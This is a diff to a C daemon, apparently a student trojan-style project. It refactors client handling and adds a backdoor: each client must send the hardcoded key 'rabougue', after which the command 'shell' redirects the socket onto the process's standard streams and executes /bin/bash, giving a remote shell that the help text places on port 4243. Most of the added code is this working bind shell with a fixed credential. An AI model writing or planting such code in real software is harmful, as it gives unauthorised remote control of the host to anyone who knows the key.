@@ -56,14 +56,46 @@ void	create_daemon()
 	//close(STDOUT_FILENO);
 }
 
+static bool	new_client(t_connexion *connexion, t_users *users)
+{
+	if (FD_ISSET(connexion->master_socket, &users->readfds))
+	{
+		if ((users->new_socket = accept(connexion->master_socket,
+						(struct sockaddr *)&connexion->address, (socklen_t*)&connexion->addrlen)) < 0)
+		{
+			perror("accept");
+			return (false);
+		}
+		if (users->nb_user >= 3)
+		{
+			puts("Connexion limit reached");
+			close(users->new_socket);
+		}
+		else
+		{
+			for (users->i = 0; users->i < MAX_CLIENT; users->i++)
+			{
+				if (connexion->client_socket[users->i] == 0 )
+				{
+					connexion->client_socket[users->i] = users->new_socket;
+					/*tintin->write_log("New client, id : " + std::to_string(i + 1), "\033[1;32mINFO\033[0m");*/
+					break;
+				}
+			}
+			users->nb_user++;
+		}
+	}
+	return (true);
+}
+
 bool	run_daemon(t_connexion *connexion)
 {
-	int			new_socket, activity, i, sd;
-	int			max_sd;
-	int			nb_user = 0;
 	char		buffer[BUFFSIZE + 1];
 	ssize_t		valrecv = 0;
-	fd_set		readfds;
+	char	*shell[2];
+	t_users		users;
+
+	memset(&users, 0, sizeof(users));
 
 	if (listen(connexion->master_socket, 3) < 0)
 	{
@@ -75,79 +107,74 @@ bool	run_daemon(t_connexion *connexion)
 
 	while(true)
 	{
-		FD_ZERO(&readfds);
-		FD_SET(connexion->master_socket, &readfds);
-		max_sd = connexion->master_socket;
+		FD_ZERO(&users.readfds);
+		FD_SET(connexion->master_socket, &users.readfds);
+		users.max_sd = connexion->master_socket;
 
-		for ( i = 0 ; i < MAX_CLIENT; i++)
+		for ( users.i = 0 ; users.i < MAX_CLIENT; users.i++)
 		{
-			sd = connexion->client_socket[i];
-			if(sd > 0)
-				FD_SET( sd , &readfds);
-			if(sd > max_sd)
-				max_sd = sd;
+			users.sd = connexion->client_socket[users.i];
+			if (users.sd > 0)
+				FD_SET(users.sd , &users.readfds);
+			if (users.sd > users.max_sd)
+				users.max_sd = users.sd;
 		}
-		activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);
+		users.activity = select(users.max_sd + 1 , &users.readfds , NULL , NULL , NULL);
 		//if ((activity < 0) && (errno!=EINTR))
 			////printf("select error");
 
-		if (FD_ISSET(connexion->master_socket, &readfds))
-		{
-			if ((new_socket = accept(connexion->master_socket,
-							(struct sockaddr *)&connexion->address, (socklen_t*)&connexion->addrlen))<0)
-			{
-				perror("accept");
-				return (false);
-			}
-			if (nb_user >= 3)
-			{
-				puts("Connexion limit reached");
-				close(new_socket);
-			}
-			else
-			{
-				for (i = 0; i < MAX_CLIENT; i++)
-				{
-					if(connexion->client_socket[i] == 0 )
-					{
-						connexion->client_socket[i] = new_socket;
-						/*tintin->write_log("New client, id : " + std::to_string(i + 1), "\033[1;32mINFO\033[0m");*/
-						break;
-					}
-				}
-				nb_user++;
-			}
-		}
 
-		for (i = 0; i < MAX_CLIENT; i++)
+		if (new_client(connexion, &users) == false)
+			return (false);
+
+
+		for (users.i = 0; users.i < MAX_CLIENT; users.i++)
 		{
-			sd = connexion->client_socket[i];
-			if (FD_ISSET( sd , &readfds))
+			users.sd = connexion->client_socket[users.i];
+			if (users.key[users.i] == false)
+				send(users.sd, "KEY: ", 5, 0);
+			else
+				send(users.sd, "> ", 2, 0);
+
+			if (FD_ISSET(users.sd , &users.readfds))
 			{
-				if ((valrecv = recv(sd , buffer, BUFFSIZE, 0)) == 0)
+				if ((valrecv = recv(users.sd , buffer, BUFFSIZE, 0)) == 0)
 				{
-					/*getpeername(sd , (struct sockaddr*)&connexion->address , (socklen_t*)&connexion->addrlen);*/
-					/*tintin->write_log("User " + std::to_string(i + 1) + " request quit", "\033[1;35mLOG\033[0m");*/
-					close(sd);
-					connexion->client_socket[i] = 0;
-					nb_user--;
+					close(users.sd);
+					connexion->client_socket[users.i] = 0;
+					users.nb_user--;
+					users.key[users.i] = false;
 				}
 				else
 				{
 					buffer[valrecv -1] = '\0';
-					if (!strcmp(buffer, "quit"))
+					if (users.key[users.i] == false)
 					{
-						/*tintin->write_log("Client " + std::to_string(i + 1) + " request quit", "\033[1;35mLOG\033[0m");*/
-						close( sd );
-						connexion->client_socket[i] = 0;
-						nb_user--;
+						if (!strcmp(buffer, "rabougue"))
+							users.key[users.i] = true;
 					}
 					else
 					{
-						puts(buffer);
-						/*if (!strncmp(buffer, "0xrabougue", 10))*/
-							/*strcpy(buffer, ft_decrypt(&buffer[10]));*/
-						/*tintin->write_log(buffer, "\033[1;35mLOG\033[0m");*/
+						// c'est ici qu'on interprete la command
+						if (!strcmp(buffer, "quit"))
+						{
+							close( users.sd );
+							connexion->client_socket[users.i] = 0;
+							users.key[users.i] = false;
+							users.nb_user--;
+						}
+						if (!strcmp(buffer, "?"))
+							puts("shell	Spawn remote shell on 4243");
+						if (!strcmp(buffer, "shell"))
+						{
+							 for(int i=0; i<3; i++)
+								dup2(users.sd, i);
+
+							shell[0] = "/bin/bash";
+							shell[1] = 0;
+							if (execve(shell[0], shell, NULL) == -1)
+								printf("error\n");
+						}
 					}
 					memset(&buffer, 0, BUFFSIZE);
 				}
